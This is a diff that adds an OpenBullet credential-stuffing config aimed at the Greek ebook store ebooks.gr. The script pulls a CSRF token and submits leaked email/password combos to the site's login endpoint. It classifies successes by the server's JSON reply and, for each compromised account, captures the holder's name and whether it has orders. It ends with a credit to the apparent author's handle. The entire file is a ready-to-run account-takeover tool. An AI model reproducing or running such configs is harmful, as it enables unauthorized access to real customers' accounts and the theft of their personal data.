@@ -1,0 +1,135 @@
+[SETTINGS]
+{
+  "Name": "ebooks",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-29T03:02:38.2294863+02:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.ebooks.gr/gr/account/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#csrf PARSE "<SOURCE>" LR "type=\"hidden\" name=\"_csrf\" value=\"" "\"" -> VAR "csrf" 
+
+REQUEST POST "https://www.ebooks.gr/account/dispatch.php" 
+  CONTENT "action=login&_csrf=<csrf>&email=<USER>&password=<PASS>&login-submit=%CE%95%CE%AF%CF%83%CE%BF%CE%B4%CE%BF%CF%82" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.ebooks.gr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 152" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://www.ebooks.gr" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.ebooks.gr/gr/account/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":\"\\u0397 \\u03c3\\u03cd\\u03bd\\u03b4\\u03b5\\u03c3\\u03b7 \\u03c3\\u03b1\\u03c2 \\u03ad\\u03b3\\u03b9\\u03bd\\u03b5 \\u03bc\\u03b5 \\u03b5\\u03c0\\u03b9\\u03c4\\u03c5\\u03c7\\u03af\\u03b1\",\"action\":{\"refresh\":true}}" 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"\\u0394\\u03b5\\u03bd \\u03ae\\u03c4\\u03b1\\u03bd \\u03b4\\u03c5\\u03bd\\u03b1\\u03c4\\u03ae \\u03b7 \\u03c3\\u03cd\\u03bd\\u03b4\\u03b5\\u03c3\\u03b7.\\u03a0\\u03b1\\u03c1\\u03b1\\u03ba\\u03b1\\u03bb\\u03c9 \\u03c0\\u03bf\\u03bb\\u03cd \\u03b5\\u03bb\\u03ad\\u03b3\\u03be\\u03c4\\u03b5 \\u03c4\\u03bf e-mail \\u03ba\\u03b1\\u03b9 \\u03c4\\u03bf\\u03bd \\u03ba\\u03c9\\u03b4\\u03b9\\u03ba\\u03cc \\u03c0\\u03c1\\u03cc\\u03c3\\u03b2\\u03b1\\u03c3\\u03b7\\u03c2.\"}" 
+
+REQUEST GET "https://www.ebooks.gr/account/" 
+  
+  HEADER "Host: www.ebooks.gr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.ebooks.gr/account/account.php" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Name PARSE "<SOURCE>" LR "<p>Γεία σου , <strong>" "</strong>" CreateEmpty=FALSE -> CAP "Name" 
+
+REQUEST GET "https://www.ebooks.gr/account/orders.php" 
+  
+  HEADER "Host: www.ebooks.gr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.ebooks.gr/account/account.php" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+IF "<SOURCE>" Contains "Δεν έχετε παραγγελίες στο Λογαριασμό σας"
+SET CAP "Has Orders" "False"
+ELSE
+SET CAP "Has Orders" "True"
+ENDIF
+
+#see FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁(🔝)/@Koko_Nader" -> CAP "Checked By" 
+
